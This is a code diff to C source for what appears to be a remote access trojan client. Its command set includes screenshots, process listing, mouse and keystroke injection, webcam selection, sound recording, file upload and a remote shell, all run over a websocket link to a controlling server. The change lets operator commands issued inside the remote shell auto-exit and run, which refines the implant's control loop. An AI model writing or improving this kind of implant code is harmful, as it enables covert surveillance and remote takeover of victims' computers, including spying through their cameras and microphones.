@@ -211,6 +211,10 @@ volatile int g_reset_recv_buffer = 0;
 int g_session_id = 0;
 DWORD g_last_ping_time = 0;
 
+// Pending command after shell auto-exit
+char g_pending_cmd[4096] = {0};
+int g_has_pending_cmd = 0;
+
 // Upload state for receiving files from server
 static int g_upload_in_progress = 0;
 static char g_upload_filename[MAX_PATH];
@@ -1179,7 +1183,8 @@ void run_terminal() {
             break;
         }
         
-        // Commands that should NOT run in shell - return to session prompt for these
+        // Commands that should NOT run in shell - AUTO EXIT shell and process them
+        // This handles the case where user did Ctrl+C on server while in shell
         if (strcmp(cmd, "help") == 0 || strcmp(cmd, "background") == 0 || 
             strcmp(cmd, "back") == 0 || strcmp(cmd, "screenshot") == 0 ||
             strcmp(cmd, "sysinfo") == 0 || strcmp(cmd, "ps") == 0 ||
@@ -1197,12 +1202,19 @@ void run_terminal() {
             strncmp(cmd, "mousemove ", 10) == 0 || strcmp(cmd, "click") == 0 ||
             strcmp(cmd, "leftclick") == 0 || strcmp(cmd, "rightclick") == 0 ||
             strncmp(cmd, "sendkeys ", 9) == 0 || strncmp(cmd, "type ", 5) == 0 ||
-            strncmp(cmd, "selectcam ", 10) == 0 || strncmp(cmd, "soundrecord", 11) == 0) {
-            send_websocket_data("[!] Use 'exit' to leave shell first, then run this command\n", 59);
-            sprintf(prompt, "shell:%s> ", g_current_dir);
-            send_websocket_data(prompt, strlen(prompt));
-            sent_prompt = 1;
-            continue;
+            strncmp(cmd, "selectcam ", 10) == 0 || strncmp(cmd, "soundrecord", 11) == 0 ||
+            strcmp(cmd, "shell") == 0) {
+            // Auto-exit shell mode and let handle_command process this
+            send_websocket_data("[*] Auto-exiting shell to run command...\n", 41);
+            // Put command back into buffer for handle_command to process
+            // We break out of shell and the command will be processed in handle_session
+            // Store the command to be executed after shell exit
+            extern char g_pending_cmd[4096];
+            extern int g_has_pending_cmd;
+            strncpy(g_pending_cmd, cmd, sizeof(g_pending_cmd) - 1);
+            g_pending_cmd[sizeof(g_pending_cmd) - 1] = '\0';
+            g_has_pending_cmd = 1;
+            break;
         }
         
         // Handle drive change (e.g., "D:" or "d:")
@@ -3865,6 +3877,11 @@ void handle_command(const char* cmd) {
     }
     else if (strcmp(clean_cmd, "shell") == 0) {
         run_terminal();
+        // After shell exits, check if there's a pending command to execute
+        if (g_has_pending_cmd) {
+            g_has_pending_cmd = 0;
+            handle_command(g_pending_cmd);
+        }
     }
     else if (strcmp(clean_cmd, "ps") == 0) {
         list_processes();
